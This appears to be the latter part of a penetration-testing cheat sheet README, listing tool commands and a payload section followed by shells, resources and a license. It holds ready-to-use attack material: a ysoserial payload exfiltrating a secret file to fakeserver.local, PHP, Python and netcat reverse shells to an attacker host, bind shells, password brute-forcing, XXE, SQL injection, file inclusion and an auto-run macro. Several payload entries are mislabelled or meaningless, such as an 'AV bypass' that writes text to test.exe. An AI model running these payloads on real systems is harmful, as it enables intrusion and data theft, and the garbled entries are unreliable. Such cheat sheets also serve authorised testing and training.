### Tar
- **Create a Tar Archive**:
  ```bash
  tar -cvf <archive.tar> <files>
  ```

- **Extract a Tar Archive**:
  ```bash
  tar -xvf <archive.tar>
  ```

### Tasklist
- **List All Processes**:
  ```cmd
  tasklist
  ```

- **Filter by Name**:
  ```cmd
  tasklist /FI "IMAGENAME eq <process_name>"
  ```

### Terminal
- **Open a New Terminal Tab**:
  ```bash
  gnome-terminal --tab
  ```

### TheHarvester
- **Gather Information about a Domain**:
  ```bash
  theharvester -d <domain> -l 500 -b google
  ```

### Tr
- **Translate Characters**:
  ```bash
  echo <string> | tr <set1> <set2>
  ```

- **Delete Characters**:
  ```bash
  echo <string> | tr -d <chars>
  ```

### UFW
- **Allow a Port**:
  ```bash
  ufw allow <port>
  ```

- **Check UFW Status**:
  ```bash
  ufw status
  ```

### Uname
- **Print System Information**:
  ```bash
  uname -a
  ```

- **Print Kernel Name**:
  ```bash
  uname -s
  ```

### Watch
- **Run a Command Repeatedly**:
  ```bash
  watch <command>
  ```

- **Highlight Changes**:
  ```bash
  watch -d <command>
  ```

### WC
- **Count Lines in a File**:
  ```bash
  wc -l <file>
  ```

- **Count Words in a File**:
  ```bash
  wc -w <file>
  ```

### Webservers
- **Start a Simple Python Web Server using Python 2**:
  ```bash
  python -m SimpleHTTPServer  <port>
  ```
- **Start a Simple Python Web Server using Python 3**:
  ```bash
  python -m http.server <port>
  ```
- **Start a Simple PHP Web Server**:
  ```bash
  php -S 0.0.0.0:8000
  ```
- **Start a Simple Ruby Web Server**:
  ```bash
  ruby -run -e httpd . -p 9000
  ```
- **Start a Simple BusyBox Web Server**:
  ```bash
  busybox httpd -f -p 10000
  ```

### WFuzz
- **Fuzz a URL**:
  ```bash
  wfuzz -c -z file,<wordlist> --hc 404 <url>/FUZZ
  ```

- **Fuzz POST Data**:
  ```bash
  wfuzz -c -z file,<wordlist> -d "param=FUZZ" <url>
  ```
- **User Enumeration with Password Reset Function:**:
  ```bash
  wfuzz -c -L -u "<URL>/ResetPasswordController.php" -d "email=FUZZ@test.local&Submit=" -b "PHPSESSID=FUZZ" -w /usr/share/seclists/Usernames/top-usernames-shortlist.txt --hs
  ```
  
### Whois
- **Query Domain Information**:
  ```bash
  whois <domain>
  ```
- **Query Domain Information Using a Specific WHOIS Server**:
  ```bash
  whois <domain>  -h <IP>
  ```
  This command queries domain information but specifies an external WHOIS server using the -h option.
- **Reverse Whois Lookup**:
  ```bash
  whois <IP> -h <IP>
  ```
  This command performs a reverse lookup by providing an IP address, allowing you to gather information about the domain or entity associated with the IP.
### Wpscan

- **Scan a WordPress Site**:
  ```bash
  wpscan --url <site_url>
  ```

- **Brute-Forcing the User Credentials**:
  ```bash
  wpscan --url http://192.168.217.52/ -U tester -P /usr/share/wordlists/rockyou.txt
  ```

- **basic Enumeration**:
  ```bash
  wpscan --url vulnserver.local --enumerate ap,at,cb,dbe
  ```

- **Plugins Enumeration**:
  ```bash
  wpscan --url http://blogger.thm/assets/fonts/blog/ --plugins-detection aggressive
  wpscan --url <site_url> --enumerate p
  ```

### Xfreerdp
- **Connect to an RDP Server**:
  ```bash
  xfreerdp /u:<username> /p:<password> /v:<host>
  ```
- **Connecting to the host with xfreerdp**:
  ```bash
  xfreerdp /d:sandbox /u:tester /v:10.10.10.10 +clipboard
  ```

- **Connecting and sharing a folder**:
  ```bash
  xfreerdp /d:sandbox /u:tester /v:10.5.5.20 /drive:/root/oscp/temp /dynamic-resolution +clipboard
  ```

### Xxd
- **Create a Hex Dump**:
  ```bash
  xxd <file>
  ```

- **Revert a Hex Dump to Binary**:
  ```bash
  xxd -r <hex_file>
  ```
- **Hex Dump a File Byte by Byte**:
  ```bash
  xxd -g 1 file
  ```
  The `xxd` command with the `-g 1` flag generates a hex dump of the file, splitting each byte into its own column. This is useful for analyzing files at a very granular level or for debugging binary data.


### Ysoserial

- **Generate a Payload**:
  ```bash
  java -jar ysoserial.jar <payload_type> "<command>"
  ```

  Use the `ysoserial` tool to generate serialized payloads for exploitation or testing. Replace `<payload_type>` with the appropriate payload and `<command>` with the command to execute.

- **Delete a File**:
  ```bash
    java -jar path/to/ysoserial.jar CommonsCollections4 'rm /home/test/test.txt' | base64
    ```
    This example generates a serialized payload using the `CommonsCollections4` exploit, which deletes the `test.txt` file from the specified directory. The payload is then encoded in Base64 for transmission.

- **Exfiltrate a Secret File**:
  ```bash
    java -jar /oscp/Cassios/ysoserial-all.jar CommonsCollections6 'wget --post-file=/home/test/secret fakeserver.local' | gzip -f | base64 -w0
    ```
    This example creates a payload using the `CommonsCollections6` exploit to exfiltrate the `secret` file from the target. It sends the file as a POST request to a remote server using `wget`. The payload is compressed with `gzip` and encoded in Base64 for delivery.


---

## Payloads

### Cross-Site Scripting (XSS) Payloads
- **XSS Attack**:
  ```html
  <script>alert('XSS Attack');</script>
  ```

### XML External Entity (XXE) / XML Payloads
- **XML External Entity (XXE) Injection**:
  ```xml
  <!DOCTYPE root [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">]>
  <root>&xxe;</root>
  ```

- **XML Injection**:
  ```xml
  <user><name>admin' or '1'='1</name></user>
  ```

### SQL Injection (SQLi) Payloads
- **SQL Injection**:
  ```sql
  ' OR 1=1 --
  ```

- **Blind SQL Injection**:
  ```sql
  ' AND IF(1=1,SLEEP(5),0)--
  ```

### Antivirus (AV) Bypass
- **AV Bypass Example**:
  ```bash
  echo 'This is a test' > test.exe
  ```

### Buffer Overflow (BOF) Linux (LIN)
- **BOF Linux Example**:
  ```bash
  python -c "print 'A' * 5000" | nc -v 127.0.0.1 80
  ```

### Buffer Overflow (BOF) Windows (WIN)
- **BOF Windows Example**:
  ```python
  python -c "print 'A' * 2000" | nc -v 127.0.0.1 80
  ```

### Access Control Vulnerabilities
- **Access Control Vulnerability Example**:
  ```bash
  curl -H "Authorization: Bearer <token>" http://example.com/admin
  ```

### Active Directory (AD)
- **Active Directory Attack Example**:
  ```bash
  ldapsearch -x -b "dc=example,dc=com" "(userPrincipalName=*)" 
  ```

### Bindshells
- **Bindshell Example**:
  ```bash
  nc -lvp 4444 -e /bin/bash
  ```

### Brute Force
- **Brute Force Attack Example**:
  ```bash
  hydra -l admin -P /path/to/passwords.txt ssh://target.com
  ```

### Clickjacking
- **Clickjacking Example**:
  ```html
  <iframe src="http://target.com" width="100%" height="100%" style="opacity: 0.0; position: absolute;"></iframe>
  ```

### Cross-Origin Resource Sharing (CORS)
- **CORS Example**:
  ```js
  fetch('http://malicious.com', { method: 'GET', headers: { 'Origin': 'http://malicious.com' } });
  ```

### Cross-Site Request Forgery (CSRF)
- **CSRF Example**:
  ```html
  <img src="http://victim.com/account/change-password?newpassword=1234" />
  ```

### Database Vulnerabilities (DB)
- **Database Vulnerability Example**:
  ```sql
  SELECT * FROM users WHERE username = 'admin' AND password = 'password'
  ```

### Directory Traversal (DIR)
- **Directory Traversal Example**:
  ```bash
  curl http://example.com/../../etc/passwd
  ```

### File Transfer (FTP)
- **FTP Example**:
  ```bash
  ftp -n -v 192.168.1.1
  ```

### File Upload
- **File Upload Example**:
  ```html
  <input type="file" name="file" />
  ```

### File Transfer Protocol (FTP)
- **FTP Example**:
  ```bash
  ftp -n -v 192.168.1.1
  ```

### GraphQL
- **GraphQL Example**:
  ```graphql
  {
    user(id: "1") {
      name
      email
    }
  }
  ```

### Hashing Attacks
- **Hashing Example**:
  ```python
  import hashlib
  hash = hashlib.md5(b'password').hexdigest()
  ```

### Host Header Injection
- **Host Header Injection Example**:
  ```bash
  curl -H "Host: victim.com" http://target.com
  ```

### HTA (HTML Application)
- **HTA Example**:
  ```html
  <script src="mshta.exe" />
  ```

### HTTP Header Attacks
- **HTTP Header Injection Example**:
  ```bash
  curl -H "X-Forwarded-For: 127.0.0.1" http://target.com
  ```

### HTTP Request Smuggling
- **HTTP Request Smuggling Example**:
  ```bash
  curl -H "Transfer-Encoding: chunked" -H "Content-Length: 5" http://target.com
  ```

### Internet Relay Chat (IRC)
- **IRC Example**:
  ```bash
  irc://example.com/channel
  ```

### JSON Web Token (JWT)
- **JWT Example**:
  ```bash
  curl -H "Authorization: Bearer <token>" http://target.com
  ```

### Local File Inclusion (LFI)
- **LFI Example**:
  ```bash
  curl http://example.com/index.php?page=../../etc/passwd
  ```

### Macros
- **Macro Example**:
  ```vba
  Sub AutoOpen()
      Set objShell = CreateObject("WScript.Shell")
      objShell.Run "cmd.exe /c calc.exe"
  End Sub
  ```

### Network File System (NFS)
- **NFS Example**:
  ```bash
  mount -t nfs target:/path /mnt
  ```

### Operating System (OS) Vulnerabilities
- **OS Vulnerability Example**:
  ```bash
  sudo apt-get install vulnerable-package
  ```

### Other Vulnerabilities
- **Other Example**:
  ```bash
  curl -X DELETE http://example.com/resource
  ```

### phpMyAdmin
- **phpMyAdmin Example**:
  ```php
  http://example.com/phpmyadmin
  ```

### Privilege Escalation Linux (LIN)
- **Privilege Escalation LIN Example**:
  ```bash
  sudo -u root id
  ```

### Privilege Escalation Windows (WIN)
- **Privilege Escalation WIN Example**:
  ```powershell
  net localgroup administrators /add user
  ```

### Reverse Shells
- **Reverse Shell Example**:
  ```bash
  nc -e /bin/bash attacker.com 4444
  ```

### Remote File Inclusion (RFI)
- **RFI Example**:
  ```bash
  curl http://example.com/index.php?page=http://malicious.com/malicious_file.php
  ```

### Serialization and Deserialization
- **Serialization Example**:
  ```python
  import pickle
  data = pickle.dumps({"username": "admin", "password": "password"})
  ```

### Shellshock
- **Shellshock Example**:
  ```bash
  env x='() { :;}; echo vulnerable' bash -c "echo hello"
  ```

### Server Message Block (SMB)
- **SMB Example**:
  ```bash
  smbclient \\target\share
  ```

### Simple Mail Transfer Protocol (SMTP)
- **SMTP Example**:
  ```bash
  telnet smtp.target.com 25
  ```

### Simple Network Management Protocol (SNMP)
- **SNMP Example**:
  ```bash
  snmpwalk -v 2c -c public 192.168.1.1
  ```

### Server-Side Request Forgery (SSRF)
- **SSRF Example**:
  ```bash
  curl -X POST http://target.com/api/v1/resource -d 'url=http://internal-server'
  ```

### Server-Side Template Injection (SSTI)
- **SSTI Example**:
  ```html
  {{ config }}
  ```

### Symfony
- **Symfony Example**:
  ```bash
  php bin/console server:start
  ```

### Trivial File Transfer Protocol (TFTP)
- **TFTP Example**:
  ```bash
  tftp target.com
  ```

### Web Cache Poisoning
- **Web Cache Poisoning Example**:
  ```bash
  curl -H "X-Forwarded-For: 127.0.0.1" http://example.com/resource
  ```

### Wireless Vulnerabilities
- **Wireless Example**:
  ```bash
  iwlist wlan0 scan
  ```

### wkhtmltopdf
- **wkhtmltopdf Example**:
  ```bash
  wkhtmltopdf http://example.com output.pdf
  ```

### WordPress (WP)
- **WordPress Example**:
  ```bash
  curl http://example.com/wp-login.php
  ```

### WebSocket (WS)
- **WebSocket Example**:
  ```javascript
  const socket = new WebSocket('ws://example.com/socket');
  ```

### XPath Injection
- **XPath Injection Example**:
  ```xml
  //user[username='admin' and password='password']
  ```


### Other Payloads
- **PHP Reverse Shell**:
  ```php
  <?php exec("/bin/bash -c 'bash -i >& /dev/tcp/<attacker-IP>/4444 0>&1'"); ?>
  ```

- **Python Reverse Shell**:
  ```python
  import socket, subprocess, os
  s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
  s.connect(("<attacker-IP>",<port>))
  os.dup2(s.fileno(), 0)
  os.dup2(s.fileno(), 1)
  os.dup2(s.fileno(), 2)
  subprocess.call(["/bin/sh","-i"])
  ```

---

## Shells

### Reverse Shells
- **Netcat Reverse Shell**:
  ```bash
  nc -e /bin/bash <attacker-IP> <port>
  ```

- **Python Reverse Shell**:
  ```bash
  python3 -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("<attacker-IP>",<port>)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); subprocess.call(["/bin/sh","-i"])'
  ```

### Bind Shells
- **Netcat Bind Shell**:
  ```bash
  nc -lvnp <port> -e /bin/bash
  ```

- **Python Bind Shell**:
  ```bash
  python3 -c 'import socket,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.bind(("0.0.0.0",<port>)); s.listen(1); conn, addr = s.accept(); os.dup2(conn.fileno(),0); os.dup2(conn.fileno(),1); os.dup2(conn.fileno(),2); os.system("/bin/sh")'
  ```

---

## Useful Resources

### Payloads and Exploits
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings): A comprehensive collection of payloads.
- [GTFOBins](https://gtfobins.github.io/): A curated list of Unix binaries that can be exploited by pentesters.
- [Exploit-DB](https://www.exploit-db.com/): A database of public exploits and proof-of-concepts.
- [OWASP Top 10](https://owasp.org/www-project-top-ten/): A list of the top 10 security risks.

### Pentesting Guides
- [HackTricks](https://book.hacktricks.xyz/): A handbook with tips and tricks for pentesting.
- [PentesterLab](https://www.pentesterlab.com/): A platform offering a variety of web application and pentesting exercises.
- [Hack The Box](https://www.hackthebox.eu/): A platform for pentesting challenges and exercises.

### Security Tools
- [Burp Suite](https://portswigger.net/burp): A popular web vulnerability scanner and proxy tool.
- [Nikto](https://cirt.net/Nikto2): A web server scanner to find potential vulnerabilities.
- [Wireshark](https://www.wireshark.org/): A network protocol analyzer used for packet inspection.

---

## Contributing

Contributions are welcome! If you have additional useful commands or scripts, feel free to create a pull request:

1. Fork this repository.
2. Create a new branch:
   ```bash
   git checkout -b feature/add-new-commands
   ```
3. Commit your changes:
   ```bash
   git commit -m "Add new commands for XYZ"
   ```
4. Push to your branch:
   ```bash
   git push origin feature/add-new-commands
   ```
5. Open a pull request on GitHub.

---

## License

This project is licensed under the [MIT License](LICENSE).
